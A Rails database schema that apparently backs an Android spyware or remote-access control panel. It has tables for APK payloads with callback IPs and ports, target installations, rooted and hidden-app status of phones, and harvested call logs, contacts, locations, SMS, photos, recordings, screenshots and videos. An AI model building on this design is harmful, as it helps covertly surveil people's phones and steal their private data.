# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# This file is the source Rails uses to define your schema when running `rails
# db:schema:load`. When creating a new database, `rails db:schema:load` tends to
# be faster and is potentially less error prone than running all of your
# migrations from scratch. Old migrations may fail to apply correctly if those
# migrations use external dependencies or application code.
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema.define(version: 2020_03_19_154809) do

  # These are extensions that must be enabled in order to support this database
  enable_extension "plpgsql"

  create_table "active_admin_comments", force: :cascade do |t|
    t.string "namespace"
    t.text "body"
    t.string "resource_type"
    t.bigint "resource_id"
    t.string "author_type"
    t.bigint "author_id"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["author_type", "author_id"], name: "index_active_admin_comments_on_author_type_and_author_id"
    t.index ["namespace"], name: "index_active_admin_comments_on_namespace"
    t.index ["resource_type", "resource_id"], name: "index_active_admin_comments_on_resource_type_and_resource_id"
  end

  create_table "admin_users", force: :cascade do |t|
    t.string "email", default: "", null: false
    t.string "encrypted_password", default: "", null: false
    t.string "reset_password_token"
    t.datetime "reset_password_sent_at"
    t.datetime "remember_created_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["email"], name: "index_admin_users_on_email", unique: true
    t.index ["reset_password_token"], name: "index_admin_users_on_reset_password_token", unique: true
  end

  create_table "apk_installations", force: :cascade do |t|
    t.string "taget_ip"
    t.string "status"
    t.bigint "apk_payload_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["apk_payload_id"], name: "index_apk_installations_on_apk_payload_id"
  end

  create_table "apk_payloads", force: :cascade do |t|
    t.string "destination_ip"
    t.string "destination_port"
    t.string "forwarding_ip"
    t.string "forwarding_port"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.string "name"
  end

  create_table "call_logs", force: :cascade do |t|
    t.date "date"
    t.string "source"
    t.string "destination"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id"], name: "index_call_logs_on_smartphone_id"
  end

  create_table "contacts", force: :cascade do |t|
    t.string "first_name"
    t.string "last_name"
    t.string "phone_number"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id"], name: "index_contacts_on_smartphone_id"
  end

  create_table "geo_locations", force: :cascade do |t|
    t.date "date"
    t.string "lat"
    t.string "long"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id"], name: "index_geo_locations_on_smartphone_id"
  end

  create_table "pictures", force: :cascade do |t|
    t.date "date"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id"], name: "index_pictures_on_smartphone_id"
  end

  create_table "recordings", force: :cascade do |t|
    t.date "date"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id"], name: "index_recordings_on_smartphone_id"
  end

  create_table "screenshots", force: :cascade do |t|
    t.date "date"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id"], name: "index_screenshots_on_smartphone_id"
  end

  create_table "smartphones", force: :cascade do |t|
    t.string "operating_system"
    t.string "name"
    t.string "is_rooted"
    t.string "is_app_hidden"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
  end

  create_table "sms_messages", force: :cascade do |t|
    t.date "date"
    t.string "source"
    t.string "destination"
    t.text "content"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id"], name: "index_sms_messages_on_smartphone_id"
  end

  create_table "videos", force: :cascade do |t|
    t.date "date"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id"], name: "index_videos_on_smartphone_id"
  end

  add_foreign_key "apk_installations", "apk_payloads"
  add_foreign_key "call_logs", "smartphones"
  add_foreign_key "contacts", "smartphones"
  add_foreign_key "geo_locations", "smartphones"
  add_foreign_key "pictures", "smartphones"
  add_foreign_key "recordings", "smartphones"
  add_foreign_key "screenshots", "smartphones"
  add_foreign_key "sms_messages", "smartphones"
  add_foreign_key "videos", "smartphones"
end
